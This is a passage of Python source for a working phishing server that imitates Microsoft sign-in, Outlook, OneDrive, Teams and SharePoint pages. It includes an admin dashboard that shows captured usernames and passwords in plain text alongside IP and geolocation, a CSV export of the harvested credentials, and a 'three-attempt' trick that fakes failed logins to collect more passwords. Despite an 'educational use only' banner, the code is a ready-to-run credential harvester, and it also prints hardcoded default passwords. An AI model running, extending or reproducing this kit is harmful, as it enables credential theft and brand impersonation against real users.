    def _get_attempt_count(self, ip: str, username: str) -> int:
        try:
            with sqlite3.connect(self.db.db_path) as conn:
                cursor = conn.cursor()
                cursor.execute('SELECT attempt_count FROM login_attempts WHERE ip=? AND username=?', (ip, username))
                row = cursor.fetchone()
                return row[0] if row else 0
        except:
            return 0
    
    def _save_attempt_count(self, ip: str, username: str, count: int):
        try:
            with sqlite3.connect(self.db.db_path) as conn:
                cursor = conn.cursor()
                cursor.execute('''
                    INSERT OR REPLACE INTO login_attempts (ip, username, attempt_count, last_attempt) 
                    VALUES (?, ?, ?, ?)
                ''', (ip, username, count, datetime.now().isoformat()))
                conn.commit()
        except:
            pass
    
    def _reset_attempt_count(self, ip: str, username: str):
        try:
            with sqlite3.connect(self.db.db_path) as conn:
                cursor = conn.cursor()
                cursor.execute('DELETE FROM login_attempts WHERE ip=? AND username=?', (ip, username))
                conn.commit()
        except:
            pass
    
    def _handle_export(self):
        creds = self.db.get_credentials(10000)
        output = io.StringIO()
        writer = csv.writer(output)
        writer.writerow(['ID', 'Timestamp', 'IP', 'Username', 'Password', 'Attempt', 'Status', 'Country', 'City'])
        for c in creds:
            status = 'Valid' if c.get('is_valid') else 'Phishing'
            writer.writerow([
                c.get('id', ''),
                c.get('timestamp', ''),
                c.get('ip', ''),
                c.get('username', ''),
                c.get('password', ''),
                c.get('attempt', 0),
                status,
                c.get('country', 'Unknown'),
                c.get('city', 'Unknown')
            ])
        
        self.send_response(200)
        self.send_header("Content-Type", "text/csv")
        self.send_header("Content-Disposition", f"attachment; filename=phishing_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv")
        self.end_headers()
        self.wfile.write(output.getvalue().encode('utf-8'))
    
    def _handle_clear(self):
        count = self.db.clear_all_credentials()
        self.alert_system.show_alert(f"Cleared {count} credentials from database", "warning")
        self._send_json(200, {"status": "success", "message": f"Cleared {count} credentials"})
    
    def _serve_admin(self):
        html = self._get_admin_html()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(html.encode('utf-8'))
    
    def _send_json(self, code, data):
        response = json.dumps(data).encode('utf-8')
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(response)
    
    def _get_admin_html(self):
        return """<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Phishing Admin Dashboard</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Arial,sans-serif;}
body{background:#f5f6fa;padding:20px;}
.container{max-width:1400px;margin:0 auto;}
.header{background:linear-gradient(135deg,#2b2b2b,#0078d4);color:white;padding:20px 30px;border-radius:12px;margin-bottom:30px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;}
.header h1{font-size:28px;font-weight:300;}
.header .badge{background:rgba(255,255,255,0.2);padding:8px 16px;border-radius:20px;font-size:14px;}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:20px;margin-bottom:30px;}
.stat-card{background:white;padding:20px;border-radius:12px;box-shadow:0 2px 8px rgba(0,0,0,0.1);}
.stat-card .label{font-size:12px;color:#7f8c8d;text-transform:uppercase;letter-spacing:1px;}
.stat-card .value{font-size:28px;font-weight:600;color:#2c3e50;margin-top:5px;}
.section{background:white;border-radius:12px;padding:20px;box-shadow:0 2px 8px rgba(0,0,0,0.1);margin-bottom:30px;}
.section h2{color:#2c3e50;margin-bottom:15px;font-weight:300;border-bottom:2px solid #ecf0f1;padding-bottom:10px;}
.btn-group{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:15px;}
.btn{padding:8px 20px;border:none;border-radius:6px;cursor:pointer;font-weight:500;}
.btn-primary{background:#3498db;color:white;}
.btn-primary:hover{background:#2980b9;}
.btn-success{background:#2ecc71;color:white;}
.btn-success:hover{background:#27ae60;}
.btn-danger{background:#e74c3c;color:white;}
.btn-danger:hover{background:#c0392b;}
table{width:100%;border-collapse:collapse;}
th{text-align:left;padding:12px;background:#f8f9fa;color:#2c3e50;font-weight:600;font-size:13px;text-transform:uppercase;}
td{padding:12px;border-bottom:1px solid #ecf0f1;font-size:14px;}
tr:hover{background:#f8f9fa;}
.badge-success{background:#2ecc71;color:white;padding:4px 12px;border-radius:12px;font-size:12px;}
.badge-danger{background:#e74c3c;color:white;padding:4px 12px;border-radius:12px;font-size:12px;}
.badge-warning{background:#f39c12;color:white;padding:4px 12px;border-radius:12px;font-size:12px;}
.badge-info{background:#3498db;color:white;padding:4px 12px;border-radius:12px;font-size:12px;}
.monospace{font-family:'Courier New',monospace;font-size:13px;}
.pages-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:10px;margin-top:10px;}
.page-link{background:#f8f9fa;padding:10px;border-radius:6px;text-align:center;text-decoration:none;color:#2c3e50;transition:all 0.3s;}
.page-link:hover{background:#0078d4;color:white;}
</style>
</head>
<body>
<div class="container">
<div class="header">
<div><h1>🎣 Phishing Admin Dashboard</h1><div style="font-size:14px;opacity:0.8;">Complete Microsoft Clone - 3-Attempt System</div></div>
<div><span class="badge">🟢 Online</span><span class="badge" style="margin-left:10px;" id="liveCount">0 captures</span></div>
</div>
<div class="stats" id="statsContainer">
<div class="stat-card"><div class="label">Total Captures</div><div class="value" id="totalCaptures">0</div></div>
<div class="stat-card"><div class="label">✅ Successful Logins</div><div class="value" id="successfulLogins" style="color:#2ecc71;">0</div></div>
<div class="stat-card"><div class="label">👤 Valid Users</div><div class="value" id="validLogins" style="color:#3498db;">0</div></div>
<div class="stat-card"><div class="label">Unique IPs</div><div class="value" id="uniqueIPs">0</div></div>
</div>
<div class="section">
<h2>🔗 Navigation Pages</h2>
<div class="pages-grid">
<a href="/" class="page-link">🏠 Home</a>
<a href="/login" class="page-link">🔐 Sign In</a>
<a href="/microsoft365" class="page-link">🏢 Microsoft 365</a>
<a href="/outlook" class="page-link">📧 Outlook</a>
<a href="/onedrive" class="page-link">☁️ OneDrive</a>
<a href="/teams" class="page-link">💬 Teams</a>
<a href="/sharepoint" class="page-link">📁 SharePoint</a>
<a href="/dashboard" class="page-link">📊 Dashboard</a>
<a href="/admin" class="page-link" style="background:#e8f4fd;">⚙️ Admin</a>
</div>
</div>
<div class="section">
<h2>📊 Captured Credentials <span class="badge badge-info" id="recordCount">0 records</span></h2>
<div class="btn-group">
<button class="btn btn-primary" onclick="loadData()">🔄 Refresh</button>
<button class="btn btn-success" onclick="exportData()">📥 Export CSV</button>
<button class="btn btn-danger" onclick="clearData()">🗑️ Clear All</button>
</div>
<div style="overflow-x:auto;">
<table>
<thead><tr><th>#</th><th>Username</th><th>Password</th><th>IP</th><th>Location</th><th>Attempt</th><th>Status</th><th>Timestamp</th></tr></thead>
<tbody id="credentialsTable"><tr><td colspan="8" style="text-align:center;color:#95a5a6;padding:30px;">Loading data...</td></tr></tbody>
</table>
</div>
</div>
<div class="section">
<h2>👤 Valid Users</h2>
<div style="overflow-x:auto;">
<table>
<thead><tr><th>Username</th><th>Full Name</th><th>Email</th><th>Status</th></tr></thead>
<tbody id="usersTable"><tr><td colspan="4" style="text-align:center;color:#95a5a6;padding:30px;">Loading users...</td></tr></tbody>
</table>
</div>
</div>
</div>
<script>
loadData();loadUsers();setInterval(loadData,3000);
function loadData(){loadStats();loadCredentials();}
async function loadStats(){
try{const r=await fetch('/api/stats');const d=await r.json();if(d.status==='success'){const s=d.data;document.getElementById('totalCaptures').textContent=s.total_captures||0;document.getElementById('successfulLogins').textContent=s.successful_logins||0;document.getElementById('validLogins').textContent=s.valid_logins||0;document.getElementById('uniqueIPs').textContent=s.unique_ips||0;document.getElementById('liveCount').textContent=s.total_captures+' captures';}}catch(e){}
}
async function loadCredentials(){
try{const r=await fetch('/api/credentials?limit=50');const d=await r.json();if(d.status==='success'){const creds=d.data.credentials||[];const total=d.data.total||0;document.getElementById('recordCount').textContent=total+' records';const tbody=document.getElementById('credentialsTable');if(creds.length===0){tbody.innerHTML='<tr><td colspan="8" style="text-align:center;color:#95a5a6;padding:30px;">No credentials captured yet</td></tr>';return;}let html='';creds.forEach((c,i)=>{const attemptBadge=c.attempt>=3?'<span class="badge-success">✅ Success</span>':'<span class="badge-warning">'+c.attempt+'/3</span>';const statusBadge=c.is_valid?'<span class="badge-success">Valid</span>':'<span class="badge-danger">Phishing</span>';const location=(c.city||'Unknown')+', '+(c.country||'Unknown');html+='<tr><td>'+(i+1)+'</td><td><strong>'+escapeHtml(c.username||'N/A')+'</strong></td><td><span class="monospace" style="color:#e74c3c;">'+escapeHtml(c.password||'N/A')+'</span></td><td><code>'+c.ip+'</code></td><td>'+escapeHtml(location)+'</td><td>'+attemptBadge+'</td><td>'+statusBadge+'</td><td>'+formatTimestamp(c.timestamp)+'</td></tr>';});tbody.innerHTML=html;}}catch(e){}
}
async function loadUsers(){
try{const r=await fetch('/api/users');const d=await r.json();if(d.status==='success'){const users=d.data||[];const tbody=document.getElementById('usersTable');if(users.length===0){tbody.innerHTML='<tr><td colspan="4" style="text-align:center;color:#95a5a6;padding:30px;">No users found</td></tr>';return;}let html='';users.forEach(u=>{html+='<tr><td><strong>'+escapeHtml(u.username)+'</strong></td><td>'+escapeHtml(u.full_name||'N/A')+'</td><td>'+escapeHtml(u.email||'N/A')+'</td><td><span class="badge-success">Active</span></td></tr>';});tbody.innerHTML=html;}}catch(e){}
}
function exportData(){window.location.href='/api/export';}
function clearData(){if(confirm('⚠️ Delete ALL captured credentials? This cannot be undone!')){fetch('/api/clear',{method:'POST'}).then(r=>r.json()).then(d=>{alert(d.message);loadData();});}}
function escapeHtml(t){if(!t)return'N/A';const d=document.createElement('div');d.textContent=t;return d.innerHTML;}
function formatTimestamp(t){if(!t)return'N/A';try{return new Date(t).toLocaleString();}catch(e){return t;}}
</script>
</body></html>"""


# ======================== SERVER ========================

class PhishingServer:
    def __init__(self, host="0.0.0.0", port=8080):
        self.host = host
        self.port = port
        self.server = None
        self.db = Database()
    
    def start(self):
        try:
            self.server = HTTPServer((self.host, self.port), PhishingHandler)
            
            print("\n" + "="*70)
            print("  🎣 CYBERSECURITY AWARENESS DEMO")
            print("  WITH STYLED PRODUCT IMAGES AND GRADIENTS")
            print("="*70)
            print(f"  🌐 Microsoft Home: http://localhost:{self.port}")
            print(f"  🔐 Sign In: http://localhost:{self.port}/login")
            print(f"  📊 Admin Dashboard: http://localhost:{self.port}/admin")
            print("="*70)
            print("  ⚠️  EDUCATIONAL USE ONLY")
            print("="*70)
            print("\n  💡 3-ATTEMPT SYSTEM:")
            print("     Attempt 1-2 → 'Your account or password is incorrect'")
            print("     Attempt 3   → Login success (does not store credentials)")
            print("="*70)
            print("\n  📱 PAGES:")
            print("     /              - Microsoft Homepage")
            print("     /login         - Microsoft Sign In")
            print("     /microsoft365  - Microsoft 365 Portal")
            print("     /outlook       - Outlook Email")
            print("     /onedrive      - OneDrive Storage")
            print("     /teams         - Teams Chat")
            print("     /sharepoint    - SharePoint Sites")
            print("     /dashboard     - User Dashboard")
            print("="*70)
            print("\n  👤 VALID USERS:")
            print("     student   / abc123")
            print("     admin     / admin123")
            print("     library   / library2024")
            print("     teacher   / teacher123")
            print("     staff     / staff123")
            print("="*70)
            print("\n  [*] Server running... Press Ctrl+C to stop.\n")
            
            try:
                webbrowser.open(f"http://localhost:{self.port}")
            except:
                pass
            
            self.server.serve_forever()
            
        except KeyboardInterrupt:
            self.stop()
        except Exception as e:
            print(f"[-] Error: {e}")
            self.stop()
    
    def stop(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
        print("\n[+] Server stopped.")
        stats = self.db.get_statistics()
        print("\n" + "="*60)
        print(" 📊 SESSION SUMMARY")
        print("="*60)
        print(f"  Total Captures: {stats.get('total_captures', 0)}")
        print(f"  ✅ Successful Logins: {stats.get('successful_logins', 0)}")
        print(f"  👤 Valid Users: {stats.get('valid_logins', 0)}")
        print(f"  Unique IPs: {stats.get('unique_ips', 0)}")
        print("="*60)

if __name__ == "__main__":
    server = PhishingServer()
    server.start()